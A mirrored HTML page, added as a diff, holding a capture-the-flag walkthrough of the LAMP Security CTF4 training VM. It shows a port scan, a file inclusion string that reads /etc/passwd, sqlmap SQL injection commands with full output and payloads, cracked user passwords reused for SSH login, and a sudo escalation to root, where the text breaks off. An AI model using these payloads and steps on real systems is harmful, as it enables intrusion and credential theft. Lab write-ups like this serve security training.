@@ -1,0 +1,785 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+
+<!-- Mirrored from highon.coffee/blog/lamp-security-ctf4-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:05:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<script src="https://highon.coffee/cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
+<title>LAMP Security CTF4 - Walkthrough</title>
+<meta name="description" content="LAMP Security CTF 4 - Walkthrough Guide">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic,900">
+<link rel="stylesheet" type="text/css" href="https://highon.coffee/css/screen.css">
+<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="https://highon.coffee/img/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+LAMP Security CTF4 - Walkthrough
+<a href="index.html" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+walkthroughs
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+10 Jan 2014
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<div class="coffee-rating">
+<table>
+<tbody>
+<tr>
+<td>
+<p><code>Coffee Difficulty Rating:</code></p>
+</td>
+<td>
+<p><i class="fa fa-coffee"></i></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul id="markdown-toc">
+<li><a href="#author-description" id="markdown-toc-author-description">Author Description</a></li>
+<li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a> <ul>
+<li><a href="#port-scanning" id="markdown-toc-port-scanning">Port Scanning</a></li>
+<li><a href="#service-enumeration" id="markdown-toc-service-enumeration">Service Enumeration</a></li>
+<li><a href="#http-enumeration" id="markdown-toc-http-enumeration">HTTP Enumeration</a> <ul>
+<li><a href="#lfi-exploit" id="markdown-toc-lfi-exploit">LFI Exploit</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#sqlmap-enumeration" id="markdown-toc-sqlmap-enumeration">SQLMap Enumeration</a> <ul>
+<li><a href="#sqlmap" id="markdown-toc-sqlmap">SQLMap</a></li>
+<li><a href="#sqlmap-dump-hahes--crack-hashes" id="markdown-toc-sqlmap-dump-hahes--crack-hashes">SQLMap Dump Hahes + Crack hashes</a></li>
+</ul>
+</li>
+<li><a href="#ssh-login" id="markdown-toc-ssh-login">SSH Login</a></li>
+<li><a href="#linux-local-privilege-escalation" id="markdown-toc-linux-local-privilege-escalation">Linux Local Privilege Escalation</a></li>
+<li><a href="#post-exploitation-enumeration" id="markdown-toc-post-exploitation-enumeration">Post Exploitation Enumeration</a></li>
+</ul>
+<h2 id="author-description">Author Description</h2>
+<p>The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products. Please note there are other capture the flag exercises (not just the latest one). Check the SourceForge site to find other exercises available (http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/).</p>
+<p><strong>Author:</strong> madirish2600</p>
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/">VulnHub</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap -v -p 1-65535 -sV -O -sT 192.168.30.147</code></pre></figure>
+<div class="note info">
+<h5>Dislcaimer: Multiple Entry Points</h5>
+<p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p>
+</div>
+<h3 id="service-enumeration">Service Enumeration</h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>TCP: 22</code></p></pc>
+</td>
+<td>
+<pc><p>SSH</p></pc>
+</td>
+<td>
+<pc><p>OpenSSH 4.3 (protocol 2.0)</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 25</code></p></pc>
+</td>
+<td>
+<pc><p>SMTP</p></pc>
+</td>
+<td>
+<pc><p>Sendmail 8.13.5/8.13.5</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 80</code></p></pc>
+</td>
+<td>
+<pc><p>HTTPD</p></pc>
+</td>
+<td>
+<pc><p>Apache httpd 2.2.0 ((Fedora))</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p>Inspection of the Web Application revealed the blog used GET requests.</p>
+<h4 id="lfi-exploit">LFI Exploit</h4>
+<p>The string <code>index.html?page=../../../../../../etc/passwd%00</code> exposed the contents on the unix passwd file.</p>
+<p><img src="https://highon.coffee/img/blog/ctf4/LFI.png" alt="OWASP DirBuster" /></p>
+<p>RFI did not appear possible.</p>
+<h2 id="sqlmap-enumeration">SQLMap Enumeration</h2>
+<p>SQLMap was leveraged to enumerate, inject and dump the MySQL databases on the target.</p>
+<h3 id="sqlmap">SQLMap</h3>
+<p>Using the GET ‘id’ as the injection point, the following SQLMap command was used to successfully list tables for all databases on the target system.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sqlmap -u <span class="s2">"http://192.168.30.147/index.html?page=blog&amp;title=Blog&amp;id=2"</span> -p id --tables</code></pre></figure>
+<p>Full SQLMap Command Output:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">_
+___ ___| |_____ ___ ___  <span class="o">{</span>1.0-dev-nongit-0826<span class="o">}</span>
+|_ -| . | |     | .<span class="s1">'| . |
+|___|_  |_|_|_|_|__,|  _|
+|_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting at 12:05:38
+
+<span class="o">[</span>12:05:38] <span class="o">[</span>INFO] testing connection to the target URL
+<span class="o">[</span>12:05:38] <span class="o">[</span>INFO] testing <span class="k">if </span>the target URL is stable
+<span class="o">[</span>12:05:39] <span class="o">[</span>INFO] target URL is stable
+<span class="o">[</span>12:05:39] <span class="o">[</span>INFO] heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that GET parameter <span class="s1">'id'</span> might be injectable <span class="o">(</span>possible DBMS: <span class="s1">'MySQL'</span><span class="o">)</span>
+<span class="o">[</span>12:05:39] <span class="o">[</span>INFO] testing <span class="k">for </span>SQL injection on GET parameter <span class="s1">'id'</span>
+it looks like the back-end DBMS is <span class="s1">'MySQL'</span>. Do you want to skip <span class="nb">test </span>payloads specific <span class="k">for </span>other DBMSes? <span class="o">[</span>Y/n] Y
+<span class="k">for </span>the remaining tests, <span class="k">do </span>you want to include all tests <span class="k">for</span> <span class="s1">'MySQL'</span> extending provided level <span class="o">(</span>1<span class="o">)</span> and risk <span class="o">(</span>1<span class="o">)</span> values? <span class="o">[</span>Y/n] Y
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'AND boolean-based blind - WHERE or HAVING clause'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] GET parameter <span class="s1">'id'</span> seems to be <span class="s1">'AND boolean-based blind - WHERE or HAVING clause'</span> injectable
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 4.1 OR error-based - WHERE, HAVING clause'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL OR error-based - WHERE or HAVING clause'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.0 error-based - Parameter replace'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL inline queries'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt; 5.0.11 stacked queries (SELECT - comment)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>WARNING] <span class="nb">time</span>-based comparison requires larger statistical model, please wait....                                                                                         
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt; 5.0.11 stacked queries (SELECT)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt; 5.0.11 stacked queries (comment)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt; 5.0.11 stacked queries'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &lt; 5.0.12 stacked queries (heavy query - comment)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &lt; 5.0.12 stacked queries (heavy query)'</span>
+<span class="o">[</span>12:05:57] <span class="o">[</span>INFO] testing <span class="s1">'MySQL &gt;= 5.0.12 AND time-based blind (SELECT)'</span>
+<span class="o">[</span>12:06:08] <span class="o">[</span>INFO] GET parameter <span class="s1">'id'</span> seems to be <span class="s1">'MySQL &gt;= 5.0.12 AND time-based blind (SELECT)'</span> injectable
+<span class="o">[</span>12:06:08] <span class="o">[</span>INFO] testing <span class="s1">'Generic UNION query (NULL) - 1 to 20 columns'</span>
+<span class="o">[</span>12:06:08] <span class="o">[</span>INFO] automatically extending ranges <span class="k">for </span>UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
+<span class="o">[</span>12:06:08] <span class="o">[</span>INFO] ORDER BY technique seems to be usable. This should reduce the <span class="nb">time </span>needed to find the right number of query columns. Automatically extending the range <span class="k">for </span>current UNION query injection technique <span class="nb">test</span>
+<span class="o">[</span>12:06:08] <span class="o">[</span>INFO] target URL appears to have 5 columns <span class="k">in </span>query
+<span class="o">[</span>12:06:08] <span class="o">[</span>INFO] GET parameter <span class="s1">'id'</span> is <span class="s1">'Generic UNION query (NULL) - 1 to 20 columns'</span> injectable
+GET parameter <span class="s1">'id'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
+sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 45 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+---
+Parameter: id <span class="o">(</span>GET<span class="o">)</span>
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: <span class="nv">page</span><span class="o">=</span>blog&amp;title<span class="o">=</span>Blog&amp;id<span class="o">=</span>2 AND <span class="nv">7114</span><span class="o">=</span>7114
+
+Type: AND/OR <span class="nb">time</span>-based blind
+Title: MySQL &gt;<span class="o">=</span> 5.0.12 AND <span class="nb">time</span>-based blind <span class="o">(</span>SELECT<span class="o">)</span>
+Payload: <span class="nv">page</span><span class="o">=</span>blog&amp;title<span class="o">=</span>Blog&amp;id<span class="o">=</span>2 AND <span class="o">(</span>SELECT <span class="k">*</span> FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span>5<span class="o">)))</span>kOtW<span class="o">)</span>
+
+Type: UNION query
+Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 5 columns
+Payload: <span class="nv">page</span><span class="o">=</span>blog&amp;title<span class="o">=</span>Blog&amp;id<span class="o">=</span>2 UNION ALL SELECT NULL,NULL,NULL,CONCAT<span class="o">(</span>0x7162707871,0x4f75614351414f4d6e69,0x7176717671<span class="o">)</span>,NULL--
+---
+<span class="o">[</span>12:06:31] <span class="o">[</span>INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 5 <span class="o">(</span>Bordeaux<span class="o">)</span>
+web application technology: Apache 2.2.0, PHP 5.1.2
+back-end DBMS: MySQL 5.0.12
+<span class="o">[</span>12:06:31] <span class="o">[</span>INFO] fetching database names
+<span class="o">[</span>12:06:31] <span class="o">[</span>INFO] fetching tables <span class="k">for </span>databases: <span class="s1">'calendar, ehks, information_schema, mysql, roundcubemail, test'</span>
+Database: calendar
+<span class="o">[</span>5 tables]
++---------------------------------------+
+| phpc_calendars                        |
+| phpc_events                           |
+| phpc_sequence                         |
+| phpc_users                            |
+| uid                                   |
++---------------------------------------+
+
+Database: roundcubemail
+<span class="o">[</span>6 tables]
++---------------------------------------+
+| session                               |
+| cache                                 |
+| contacts                              |
+| identities                            |
+| messages                              |
+| users                                 |
++---------------------------------------+
+
+Database: ehks
+<span class="o">[</span>3 tables]
++---------------------------------------+
+| user                                  |
+| blog                                  |
+| comment                               |
++---------------------------------------+
+
+Database: information_schema
+<span class="o">[</span>16 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+Database: mysql
+<span class="o">[</span>17 tables]
++---------------------------------------+
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| host                                  |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+</code></pre></figure>
+<h3 id="sqlmap-dump-hahes--crack-hashes">SQLMap Dump Hahes + Crack hashes</h3>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sqlmap -u <span class="s2">"http://192.168.30.147/index.html?page=blog&amp;title=Blog&amp;id=2"</span> -p id -D ehks -T user  --dump</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">_
+___ ___| |_____ ___ ___  <span class="o">{</span>1.0-dev-nongit-0826<span class="o">}</span>
+|_ -| . | |     | .<span class="s1">'| . |
+|___|_  |_|_|_|_|__,|  _|
+|_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting at 12:15:25
+
+<span class="o">[</span>12:15:25] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
+<span class="o">[</span>12:15:25] <span class="o">[</span>INFO] testing connection to the target URL
+sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
+---
+Parameter: id <span class="o">(</span>GET<span class="o">)</span>
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: <span class="nv">page</span><span class="o">=</span>blog&amp;title<span class="o">=</span>Blog&amp;id<span class="o">=</span>2 AND <span class="nv">7114</span><span class="o">=</span>7114
+
+Type: AND/OR <span class="nb">time</span>-based blind
+Title: MySQL &gt;<span class="o">=</span> 5.0.12 AND <span class="nb">time</span>-based blind <span class="o">(</span>SELECT<span class="o">)</span>
+Payload: <span class="nv">page</span><span class="o">=</span>blog&amp;title<span class="o">=</span>Blog&amp;id<span class="o">=</span>2 AND <span class="o">(</span>SELECT <span class="k">*</span> FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span>5<span class="o">)))</span>kOtW<span class="o">)</span>
+
+Type: UNION query
+Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 5 columns
+Payload: <span class="nv">page</span><span class="o">=</span>blog&amp;title<span class="o">=</span>Blog&amp;id<span class="o">=</span>2 UNION ALL SELECT NULL,NULL,NULL,CONCAT<span class="o">(</span>0x7162707871,0x4f75614351414f4d6e69,0x7176717671<span class="o">)</span>,NULL--
+---
+<span class="o">[</span>12:15:25] <span class="o">[</span>INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 5 <span class="o">(</span>Bordeaux<span class="o">)</span>
+web application technology: Apache 2.2.0, PHP 5.1.2
+back-end DBMS: MySQL 5.0.12
+<span class="o">[</span>12:15:25] <span class="o">[</span>INFO] fetching columns <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'ehks'</span>
+<span class="o">[</span>12:15:25] <span class="o">[</span>INFO] fetching entries <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'ehks'</span>
+<span class="o">[</span>12:15:25] <span class="o">[</span>INFO] analyzing table dump <span class="k">for </span>possible password hashes
+<span class="o">[</span>12:15:25] <span class="o">[</span>INFO] recognized possible password hashes <span class="k">in </span>column <span class="s1">'user_pass'</span>
+<span class="k">do </span>you want to store hashes to a temporary file <span class="k">for </span>eventual further processing with other tools <span class="o">[</span>y/N]
+<span class="k">do </span>you want to crack them via a dictionary-based attack? <span class="o">[</span>Y/n/q]
+<span class="o">[</span>12:15:34] <span class="o">[</span>INFO] using <span class="nb">hash </span>method <span class="s1">'md5_generic_passwd'</span>
+what dictionary <span class="k">do </span>you want to use?
+<span class="o">[</span>1] default dictionary file <span class="s1">'/usr/share/sqlmap/txt/wordlist.zip'</span> <span class="o">(</span>press Enter<span class="o">)</span>
+<span class="o">[</span>2] custom dictionary file
+<span class="o">[</span>3] file with list of dictionary files
+&gt;
+<span class="o">[</span>12:15:35] <span class="o">[</span>INFO] using default dictionary
+<span class="k">do </span>you want to use common password suffixes? <span class="o">(</span>slow!<span class="o">)</span> <span class="o">[</span>y/N]
+<span class="o">[</span>12:15:36] <span class="o">[</span>INFO] starting dictionary-based cracking <span class="o">(</span>md5_generic_passwd<span class="o">)</span>
+<span class="o">[</span>12:15:36] <span class="o">[</span>INFO] starting 4 processes
+<span class="o">[</span>12:15:37] <span class="o">[</span>INFO] cracked password <span class="s1">'Homesite'</span> <span class="k">for </span>user <span class="s1">'pmoore'</span>                                                                                                                       
+<span class="o">[</span>12:15:38] <span class="o">[</span>INFO] cracked password <span class="s1">'Sue1978'</span> <span class="k">for </span>user <span class="s1">'jdurbin'</span>                                                                                                                       
+<span class="o">[</span>12:15:39] <span class="o">[</span>INFO] cracked password <span class="s1">'ilike2surf'</span> <span class="k">for </span>user <span class="s1">'dstevens'</span>                                                                                                                   
+<span class="o">[</span>12:15:42] <span class="o">[</span>INFO] cracked password <span class="s1">'pacman'</span> <span class="k">for </span>user <span class="s1">'sorzek'</span>                                                                                                                         
+<span class="o">[</span>12:15:42] <span class="o">[</span>INFO] cracked password <span class="s1">'undone1'</span> <span class="k">for </span>user <span class="s1">'ghighland'</span>                                                                                                                     
+<span class="o">[</span>12:15:43] <span class="o">[</span>INFO] cracked password <span class="s1">'seventysixers'</span> <span class="k">for </span>user <span class="s1">'achen'</span>                                                                                                                   
+<span class="o">[</span>12:15:44] <span class="o">[</span>INFO] postprocessing table dump                                                                                                                                           
+Database: ehks
+Table: user
+<span class="o">[</span>6 entries]
++---------+-----------+--------------------------------------------------+
+| user_id | user_name | user_pass                                        |
++---------+-----------+--------------------------------------------------+
+| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 <span class="o">(</span>ilike2surf<span class="o">)</span>    |
+| 2       | achen     | b46265f1e7faa3beab09db5c28739380 <span class="o">(</span>seventysixers<span class="o">)</span> |
+| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 <span class="o">(</span>Homesite<span class="o">)</span>      |
+| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 <span class="o">(</span>Sue1978<span class="o">)</span>       |
+| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 <span class="o">(</span>pacman<span class="o">)</span>        |
+| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f <span class="o">(</span>undone1<span class="o">)</span>       |
++---------+-----------+--------------------------------------------------+
+
+<span class="o">[</span>12:15:44] <span class="o">[</span>WARNING] table <span class="s1">'ehks.`user`'</span> dumped to CSV file <span class="s1">'/root/.sqlmap/output/192.168.30.147/dump/ehks/user-f3649c95.csv'</span>
+<span class="o">[</span>12:15:44] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/root/.sqlmap/output/192.168.30.147'</span></code></pre></figure>
+<h2 id="ssh-login">SSH Login</h2>
+<p>All the dumped accounts appeared to have matching SSH accounts sharing the same credentials as the vulnerable web application.</p>
+<h2 id="linux-local-privilege-escalation">Linux Local Privilege Escalation</h2>
+<p>The account <code>achen</code> was a memeber of the sudo group.</p>
+<p>The command <code>sudo -s</code> was executed, successfully escalating privileges to super user.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span><a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4b2a28232e250b283f2d7f">[email&#160;protected]</a> ~]<span class="nv">$ </span>sudo -s
+<span class="o">[</span><a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7a0815150e3a190e1c4e">[email&#160;protected]</a> ~]# id
